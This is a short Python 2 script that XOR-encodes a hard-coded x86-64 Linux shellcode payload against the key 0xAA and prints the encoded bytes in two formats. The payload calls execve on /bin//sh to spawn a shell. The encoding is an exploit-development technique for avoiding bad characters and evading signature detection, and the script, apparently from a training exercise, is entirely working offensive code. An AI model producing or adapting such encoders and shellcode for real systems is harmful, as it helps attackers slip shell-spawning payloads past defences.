#!/usr/bin/python

# File: XOREncoder.py
# Purpose: Given shellcode, Xor against 0xAA
# NOTE: Remember the 0xAA must not appear in shellcode

shellcode = ( \
"\x48\x31\xc0\x48\x31\xdb\xb0\x3b\x53\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x48\x89\xe7\x53\x57\x48\x89\xe6\x53\x48\x89\xe2\x0f\x05")


encoded = ""
encoded2 = ""

print '[*] Encoded Shellcode..'


for byte in bytearray(shellcode):			# xoring each byte of shellcode
	output = byte ^ 0xAA				# Xor encoding
	encoded += '\\x' 				# first encoded format
	encoded += '%02x' % output			# \xcd\x80...etc

	encoded2 += '0x'				# second encoded format
	encoded2 += '%02x,' % output			# 0xcd,0x80...etc

print encoded
print encoded2


print 'Length: %d' % len(bytearray(shellcode)) 
